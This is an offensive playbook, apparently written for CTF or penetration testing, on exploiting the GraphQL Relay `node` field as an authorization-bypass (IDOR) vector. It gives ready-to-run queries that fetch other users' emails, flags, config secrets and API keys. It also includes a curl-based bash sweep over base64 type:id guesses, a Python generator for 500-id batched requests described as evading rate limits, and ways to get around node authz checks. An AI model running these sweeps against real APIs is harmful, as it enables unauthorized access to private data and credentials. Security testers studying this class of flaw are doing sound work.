# The Relay `node` interface — the built-in global IDOR

Relay's spec requires a `node(id: ID!): Node` root field that fetches *any*
object by an opaque "global id". This single field is a designed-in IDOR
interface: every type implementing `Node` is fetchable by anyone who can call
`node` — and resolvers very commonly fetch without authz because "the gateway
checks it".

---

## 1. The global id format

Convention (not spec-mandated, but near-universal):
`base64("<TypeName>:<localId>")`

```text
"User:1"              → VXNlcjox
"User:42"             → VXNlcjo0Mg==
"Post:777"            → UG9zdDo3Nzc=
"Flag:1"              → RmxhZzox
"Secret:0"            → U2VjcmV0OjA=
"Order:99"            → T3JkZXI6OTk=
"Session:abc"         → U2Vzc2lvbjphYmM=
"InternalConfig:1"    → SW50ZXJuYWxDb25maWc6MQ==
```

Variants in the wild:

- `base64("Typename:id")` — standard.
- `base64("Typename:id")` with URL-safe base64 (`-`/`_` instead of `+`/`/`).
- `base64("version:Typename:id")` — `1:User:42`.
- Plain `"User:42"` unencoded (some implementations).
- Hashid-obscured — encoder lives in the bundle.
- `toGlobalId(type, id)` in graphene — same `Type:id` encoding.

Decode observed ids first — the client bundle's own node calls reveal the
format.

## 2. The attack loop

```graphql
# 1. probe node itself
{ node(id:"VXNlcjox") { __typename } }                # → "User"

# 2. fetch with inline fragments — typename selection
{ node(id:"VXNlcjo0Mg==") { ... on User { id username email role } } }

# 3. type-confusion: ask for a type you were never offered
{ node(id:"RmxhZzox") { ... on Flag { value } } }
{ node(id:"Q29uZmlnOjE=") { ... on Config { dbPassword jwtSecret } } }
{ node(id:"SW50ZXJuYWxDb25maWc6MQ==") { ... on InternalConfig { env } } }

# 4. batch via nodes(ids:)
{ nodes(ids:["VXNlcjox","VXNlcjoy","VXNlcjoz","QWRtaW46MQ=="]) {
    __typename ... on User{email} ... on Admin{apiKey} } }
```

Type names to try as prefixes — from introspection, `did you mean` errors,
bundle greps, and CTF conventions:

```text
User Admin Account Flag Secret Config InternalConfig Settings
Session Token ApiKey Credential Password Order Payment
Document File Media Upload Comment Post Message
Debug Internal Private Hidden Feature FlagStore
```

Generate the sweep mechanically:

```bash
for t in User Admin Flag Secret Config Session Order Document; do
  for i in 0 1 2; do
    b64=$(echo -n "$t:$i" | base64 | tr '+/' '-_' | tr -d '=\n')
    echo "{\"query\":\"{node(id:\\\"$b64\\\"){__typename}}\"}"
  done
done | while read d; do
  curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d "$d" | jq -c '.data.node'
done
```

## 3. Why node resolvers skip authz

The resolver contract is "given (type,id), return object" — written like a
database driver, authorized like a service mesh. The dev who wrote
`Post.author` authz never re-checks inside `node()`. So:

- A `User` fetched via `user(id)` gets an ownership check.
- The **same User** via `node(id:"User:5")` gets no check.
- Private fields on the returned type resolve identically.

Test the pair explicitly — same object, both paths:

```graphql
{user(id:5){email}}                            # Forbidden
{node(id:"VXNlcjo1"){... on User{email}}}      # data — the bypass
```

## 4. Type-confusion on node

`node` resolves **any** type the ID decodes to — including types never meant
for the interface:

```graphql
{node(id:"SW50ZXJuYWxJTlQ6MQ=="){... on InternalINT{dump}}}   # invented type — try it
{node(id:"X19TY2hlbWE6MQ=="){__typename}}                     # __Schema:1 — silly but real
```

If the resolver does `db.get(split(id)[0], split(id)[1])`, the type is a
*table name* — arbitrary table read:

```graphql
# the resolver's table parameter is attacker-controlled
{node(id:"ZmxhZ3M6MQ=="){__typename}}          # "flags:1" — raw table name
{node(id:"Y29uZmlndXJhdGlvbjox"){__typename}}   # "configuration:1"
```

Some implementations use the type as an ORM model name — `Flag:1` errors
`Unknown type Flag` when it doesn't exist, but `Cannot query field ... on
type X` responses confirm type existence through the fragment's error.

## 5. nodes() batching — one request, N lookups

`nodes(ids:[ID!]!): [Node]!` takes an array — one request sweeps 500 ids:

```python
import base64, json
ids = [base64.b64encode(f"User:{i}".encode()).decode() for i in range(1,500)]
doc = {"query": f'{{nodes(ids:{json.dumps(ids)}){{__typename ... on User{{id email}}}}}}'}
open("/tmp/nodes.json","w").write(json.dumps(doc))
```

```bash
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d @/tmp/nodes.json
```

500 lookups, one HTTP request — also evades per-request rate limits.

## 6. When node is auth-checked

If `node` returns `Forbidden`, variants:

- `nodes()` plural may be unchecked (rare, happens).
- The *fragment* may resolve what the node-authz allowed as `__typename` —
  ask `{node(id:"VXNlcjo1"){__typename}}` → returns `"User"` even when
  field selection is blocked; then field-by-field probes on `... on User`
  may partially resolve (per-field authz gap).
- `edges`/`connections` over the same type sometimes fetch the object
  through a different resolver path: `users(first:99){edges{node{email}}}`
  — the inner `node` is NOT the root `node` and may skip authz.

## 7. Evidence

```bash
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {node(id:"VXNlcjo1"){... on User{email}}}' \
  --verdict confirms --evidence-kind impact --class web-graphql \
  --hypothesis-id h7 --evidence '"email":"other@victim.tld"' \
  --response '<verbatim>'
```

The decode step is part of the evidence — record the base64 you sent and
what it decoded to. The finding is the cross-tenant fetch, not the
base64 trick.
